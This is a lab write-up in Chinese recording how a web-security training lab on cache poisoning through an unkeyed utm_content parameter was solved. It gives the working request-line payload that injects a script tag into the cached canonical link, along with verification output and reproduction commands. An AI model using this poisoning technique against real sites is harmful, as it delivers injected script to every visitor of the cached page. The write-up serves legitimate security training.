---
title: "lab-web-cache-poisoning-unkeyed-param"
links:
  - target: cache-poisoning-family
    relation: evidences
---

# lab-web-cache-poisoning-unkeyed-param

> evidences: [[cache-poisoning-family]]

- 题面:Web cache poisoning via an unkeyed query parameter(/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)
- 实例:https://0a3800bf03560710816fde7800630001.web-security-academy.net
- 判定目标:毒化首页,使 victim 浏览器执行 `alert(1)`;状态:**solved**(solved_check true)

## 关键步

1. 面:首页 `<link rel="canonical" href='//<host>/?<query>'/>` —— **canonical 反射原始 query**(单引号属性 ✓),
   而缓存键不含 `utm_content`(请求 `/?utm_content=M1&…` 的响应里带 `Set-Cookie: utm_content=M1`,
   **cookie 不入缓存键** ✓)。
2. 缓存行为:`Cache-Control: max-age=35`,`X-Cache: hit|miss`;只带 unkeyed 参数的请求都映射到键 `/`。
3. 投毒必须发**裸字节**(`'` `<` `>` 不能被 ureq 重新编码)→ 用 `raw_poison`:
   `GET /?utm_content='/><script>alert(1)</script> HTTP/1.1`(round1 miss 存入,后续 hit ✓)。
4. 验证:普通 `GET /`(命中新鲜条目)返回的 canonical 里就是注入的脚本 ✓;victim 访问首页即弹 → 翻。

## 证据摘录

```
raw_poison "<inst>/" --request-line "GET /?utm_content='/><script>alert(1)</script> HTTP/1.1" --interval-secs 4 --count 3
 -> round1 x_cache:miss, round2/3 hit
lab_http get "<inst>/" --out /tmp/b25-l4-verify.html
 -> <link rel="canonical" href='//<host>/?utm_content='/><script>alert(1)</script>'/>
solved_check "<inst>/" --jar /tmp/b25-jar4.json -> {"solved":true}
```

## 复现命令

```
lab_launch launch F14385AB65BA5AC2E5D347C09F32B51BD9AC1E55946C15AEC01DD0F3E902A863 --widget-source /web-security/web-cache-poisoning/exploiting-implementation-flaws --jar /tmp/b25-jar4.json
raw_poison "<inst>/" --request-line "GET /?utm_content='/><script>alert(1)</script> HTTP/1.1" --interval-secs 4 --count 3
# 等 victim 访首页;新鲜期内用普通 GET / 验 canonical,再 solved_check
```
